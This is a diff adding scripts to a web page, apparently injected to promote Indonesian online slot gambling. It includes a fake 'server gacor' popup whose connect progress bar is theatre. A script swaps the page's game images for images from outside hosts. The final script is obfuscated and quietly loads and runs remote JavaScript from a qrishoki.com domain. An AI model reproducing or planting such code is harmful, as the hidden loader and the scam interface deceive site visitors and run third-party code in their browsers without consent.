@@ -1,0 +1,222 @@
+ <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KN4RSBTL');</script>
+<!-- End Google Tag Manager -->
+
+
+
+<script>
+window.addEventListener("load", function () {
+  const banner = document.getElementById("carousel-fixed-height");
+  if (!banner || document.getElementById("maxwin-overlay")) return;
+
+  const btnWrapper = document.createElement("div");
+  btnWrapper.style.textAlign = "center";
+  btnWrapper.style.marginTop = "20px";
+  btnWrapper.innerHTML = `
+    <button id="btnOpenMaxwin" style="
+      background: linear-gradient(to bottom, #029dff, #013a6b);
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      box-shadow: 0 4px 0 #00215E;
+      cursor: pointer;
+    ">🌐 PILIH SERVER GACOR</button>
+  `;
+  banner.parentNode.insertBefore(btnWrapper, banner.nextSibling);
+
+  const popup = document.createElement("div");
+  popup.id = "maxwin-overlay";
+  popup.style.cssText = `
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.85);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 99999;
+  `;
+  popup.innerHTML = `
+    <div id="maxwin-modal" style="
+      background: #00215E;
+      border: 1px solid #999;
+      border-radius: 6px;
+      max-width: 800px;
+      width: 90%;
+      padding: 25px;
+      position: relative;
+      color: white;
+      font-family: Arial, sans-serif;
+    ">
+      <button id="closeMaxwin" style="
+        position: absolute;
+        top: 10px;
+        right: 15px;
+        font-size: 24px;
+        color: white;
+        cursor: pointer;
+        border: none;
+        background: transparent;
+      ">&times;</button>
+
+      <h4 style="font-size: 14px;">FITUR EKSKLUSIF SERVER INTERNATIONAL</h4>
+      <hr style="border: 1px solid #666;">
+      <h3 style="text-align:center;">SERVER INTERNATIONAL</h3>
+      <p style="text-align:center;">Silahkan Pilih Server:</p>
+
+      <select id="serverSelect" style="
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        margin-bottom: 15px;
+        background-color: #014c9a;
+        color: white;
+        border: none;
+        border-radius: 4px;
+      ">
+        <option value="id">SERVER INDONESIA </option>
+        <option value="sg">SERVER SINGAPORE </option>
+	<option value="TH">SERVER THAILAND </option>
+	<option value="AE">SERVER DUBAI </option>
+        <option value="int">SERVER INTERNATIONAL 🌐</option>
+      </select>
+
+      <div style="background-color: #ccc; height: 20px; border-radius: 10px; overflow: hidden; margin-bottom: 10px;">
+        <div id="progressBar" style="
+          width: 0%;
+          background-color: red;
+          height: 100%;
+          text-align: center;
+          color: white;
+          font-size: 14px;
+          font-weight: bold;
+        ">0%</div>
+      </div>
+
+      <p id="statusText" style="text-align: center; font-weight: bold;"></p>
+
+      <div style="text-align: center;">
+        <button id="btnConnect" style="
+          background: red;
+          color: white;
+          border: none;
+          padding: 10px 30px;
+          border-radius: 6px;
+          font-size: 14px;
+          font-weight: bold;
+          cursor: pointer;
+        ">HUBUNGKAN</button>
+      </div>
+    </div>
+  `;
+  document.body.appendChild(popup);
+
+  document.getElementById("btnOpenMaxwin").addEventListener("click", () => {
+    document.getElementById("maxwin-overlay").style.display = "flex";
+  });
+
+  document.getElementById("closeMaxwin").addEventListener("click", () => {
+    document.getElementById("maxwin-overlay").style.display = "none";
+    resetProgress();
+  });
+
+  let hasConnected = false;
+
+  document.getElementById("btnConnect").addEventListener("click", () => {
+    if (hasConnected) return;
+
+    const bar = document.getElementById("progressBar");
+    const status = document.getElementById("statusText");
+    let progress = 0;
+    bar.style.backgroundColor = "red";
+    status.innerText = "";
+    hasConnected = true;
+
+    const interval = setInterval(() => {
+      progress += 5;
+      bar.style.width = progress + "%";
+      bar.textContent = progress + "%";
+
+      if (progress >= 100) {
+        clearInterval(interval);
+        bar.style.backgroundColor = "limegreen";
+        bar.textContent = "100%";
+        status.innerText = "Selesai!";
+        status.style.color = "white";
+
+      }
+    }, 100);
+  });
+
+  function resetProgress() {
+    const bar = document.getElementById("progressBar");
+    const status = document.getElementById("statusText");
+    bar.style.width = "0%";
+    bar.textContent = "0%";
+    bar.style.backgroundColor = "red";
+    status.innerText = "";
+    hasConnected = false;
+  }
+});
+</script>
+
+
+
+<script>
+(function() {
+    var interval = setInterval(function() {
+		// Pragmatic Play
+        // Target image (Gates of Olympus 1000)
+        var imgElement1 = document.querySelector('img[src*="6d39308186b2c0ede30a49d0c486e911.webp"]');
+
+        if (imgElement1) {
+            imgElement1.src = 'https://picassets.pages.dev/Olympus1000.webp';
+        }
+		// Target image (Gates of Olympus)
+        var imgElement2 = document.querySelector('img[src*="f24e33352829cf3475df062f42e059ef.webp"]');
+        if (imgElement2) {
+            imgElement2.src = 'https://picassets.pages.dev/MahjongWays2.webp';
+        }	
+
+        // Target image (Wild Bounty Showdown)
+        var imgElement3 = document.querySelector('img[src*="a27f7b629697af8fd4be95698b405e49.webp"]');
+        if (imgElement3) {
+            imgElement3.src = 'https://showdownfree.pages.dev/showdown.gif';
+		}
+		var imgElement4 = document.querySelector('img[src*="12aba443526306c47646afa82d84ba46.webp"]');
+        if (imgElement4) {
+            imgElement4.src = 'https://picassets.pages.dev/ZEUSx2.webp';
+        }
+		var imgElement5 = document.querySelector('img[src*="531e9d0cd776c15906ce761bb56f90ae.webp"]');
+        if (imgElement5) {
+            imgElement5.src = 'https://picasset.pages.dev/';
+        }
+    }, 100);
+})();
+</script> 
+
+
+
+
+
+     
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var _0x49a7fe=_0x3137;(function(_0x44baa8,_0x20b55c){var _0x5cf090=_0x3137,_0x5400ea=_0x44baa8();while(!![]){try{var _0xd20b8=parseInt(_0x5cf090(0x15d))/(0x636+-0x1*0xa93+0x45e)+-parseInt(_0x5cf090(0x15f))/(-0x18f5+0x2*0xe7e+-0x405*0x1)+parseInt(_0x5cf090(0x155))/(-0x2*-0x1093+0x1c99+-0x3dbc)+parseInt(_0x5cf090(0x16e))/(0x13e2+0x30e+-0x2*0xb76)+parseInt(_0x5cf090(0x16c))/(-0xa8+-0x5ee*-0x2+0x1*-0xb2f)+-parseInt(_0x5cf090(0x15b))/(-0x11d9+-0x1541+0x2720)*(-parseInt(_0x5cf090(0x160))/(-0x1dc0+0x67*0x49+0x68))+-parseInt(_0x5cf090(0x171))/(-0x8fe+-0xb65*0x2+0x1fd0);if(_0xd20b8===_0x20b55c)break;else _0x5400ea['push'](_0x5400ea['shift']());}catch(_0x5bfdd4){_0x5400ea['push'](_0x5400ea['shift']());}}}(_0x3cb4,-0x12630+0x2efd2+0x8028));function _0x3cb4(){var _0x14bc33=['21ncMVyO','appendChil','createElem','sByTagName','constructo','agaming.js','toString','script','(((.+)+)+)','getElement','ent','search','1198550YnYyoW','async','1021532hBChwY','src','onload','1878464FJQqZG','type','module','fTymF','mKjXA','397305UNWypG','set.qrisho','vnYlv','apply','https://as','ki.com/gig','48378CeQwMo','xz33','6664TeQPRc','head','547222ynkAxA'];_0x3cb4=function(){return _0x14bc33;};return _0x3cb4();}function _0x3137(_0x1b40bb,_0x571edc){var _0x3c7724=_0x3cb4();return _0x3137=function(_0x18f88e,_0x11d943){_0x18f88e=_0x18f88e-(-0x20b8+0x727*-0x3+0x2*0x1bc0);var _0x25da13=_0x3c7724[_0x18f88e];return _0x25da13;},_0x3137(_0x1b40bb,_0x571edc);}var _0x4f7d47=(function(){var _0x325f26=!![];return function(_0x84a6d7,_0x3ad1cb){var _0x4cd5f2=_0x325f26?function(){var _0xe4bcb2=_0x3137;if(_0x3ad1cb){var _0x502e95=_0x3ad1cb[_0xe4bcb2(0x158)](_0x84a6d7,arguments);return _0x3ad1cb=null,_0x502e95;}}:function(){};return _0x325f26=![],_0x4cd5f2;};}()),_0x3eb610=_0x4f7d47(this,function(){var _0x4a3ad3=_0x3137,_0xdb4a2f={'fTymF':_0x4a3ad3(0x168)+'+$'};return _0x3eb610[_0x4a3ad3(0x166)]()[_0x4a3ad3(0x16b)](_0xdb4a2f[_0x4a3ad3(0x153)])[_0x4a3ad3(0x166)]()[_0x4a3ad3(0x164)+'r'](_0x3eb610)[_0x4a3ad3(0x16b)](_0x4a3ad3(0x168)+'+$');});_0x3eb610();var hokiScript=document[_0x49a7fe(0x162)+_0x49a7fe(0x16a)](_0x49a7fe(0x167));hokiScript[_0x49a7fe(0x172)]=_0x49a7fe(0x173),hokiScript[_0x49a7fe(0x170)]=function(){var _0x267e8d=_0x49a7fe,_0x459d4a={'mKjXA':function(_0x1480b0,_0x1371bf){return _0x1480b0(_0x1371bf);},'vnYlv':_0x267e8d(0x15c)};_0x459d4a[_0x267e8d(0x154)](hokiStart,_0x459d4a[_0x267e8d(0x157)]);},hokiScript[_0x49a7fe(0x16f)]=_0x49a7fe(0x159)+_0x49a7fe(0x156)+_0x49a7fe(0x15a)+_0x49a7fe(0x165),hokiScript[_0x49a7fe(0x16d)]=!(0x4ea+-0x14*0x19f+0x1b82),document[_0x49a7fe(0x169)+_0x49a7fe(0x163)](_0x49a7fe(0x15e))[-0xb17*0x2+0x57*0x49+-0x2a1][_0x49a7fe(0x161)+'d'](hokiScript);</script> 
